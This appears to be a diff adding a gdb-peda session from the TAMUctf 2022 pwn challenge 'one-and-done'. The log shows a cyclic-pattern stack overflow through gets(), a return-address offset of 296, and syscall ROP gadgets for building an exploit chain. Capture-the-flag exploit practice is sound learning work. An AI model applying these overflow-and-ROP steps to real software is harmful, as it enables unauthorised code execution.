@@ -1,0 +1,59 @@
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/TAMUctf_2022/Pwn_One_and_Done/one-and-done
+0x00401000         0x00403000         r-xp	/home/mito/CTF/TAMUctf_2022/Pwn_One_and_Done/one-and-done
+0x00403000         0x00404000         r--p	/home/mito/CTF/TAMUctf_2022/Pwn_One_and_Done/one-and-done
+0x00404000         0x00406000         rw-p	/home/mito/CTF/TAMUctf_2022/Pwn_One_and_Done/one-and-done
+0x00007ffff7ffb000 0x00007ffff7ffe000 r--p	[vvar]
+0x00007ffff7ffe000 0x00007ffff7fff000 r-xp	[vdso]
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x4011d2 (<main>:	push   rbp)
+RCX: 0x0 
+RDX: 0x402041 (<__stdio_write+83>:	mov    rdi,rax)
+RSI: 0x405448 ("\nAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAY)
+RDI: 0x1 
+RBP: 0x416725414b254135 ('5A%KA%gA')
+RSP: 0x7fffffffdfe8 ("%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAse)
+RIP: 0x40124a (<main+120>:	ret)
+R8 : 0x405220 --> 0x5 
+R9 : 0x7fffffffde7f --> 0x4000a 
+R10: 0x1 
+R11: 0x246 
+R12: 0x7fffffffe028 ("qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQA)
+R13: 0x7fffffffe038 ("A%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAs)
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40123f <main+109>:	call   0x401795 <gets>
+   0x401244 <main+114>:	mov    eax,0x0
+   0x401249 <main+119>:	leave  
+=> 0x40124a <main+120>:	ret    
+   0x40124b <dummy>:	ret    
+   0x40124c <dummy1>:	ret    
+   0x40124d <__init_libc>:	push   rbx
+   0x40124e <__init_libc+1>:	mov    rdx,rdi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdfe8 ("%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAs)
+0008| 0x7fffffffdff0 ("A%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJA)
+0016| 0x7fffffffdff8 ("iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsK)
+0024| 0x7fffffffe000 ("%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6As)
+0032| 0x7fffffffe008 ("A%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7A)
+0040| 0x7fffffffe010 ("lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8)
+0048| 0x7fffffffe018 ("%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs)
+0056| 0x7fffffffe020 ("A%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskA)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x000000000040124a in main ()
+gdb-peda$ patto %6A%
+%6A% found at offset: 296
+
+0x000000000040100b: pop rax; ret;
+0x0000000000401793: pop rdi; ret;
+0x0000000000401713: pop rsi; ret;
+0x0000000000401f31: pop rdx; ret;
+0x0000000000401ab2: syscall; ret;
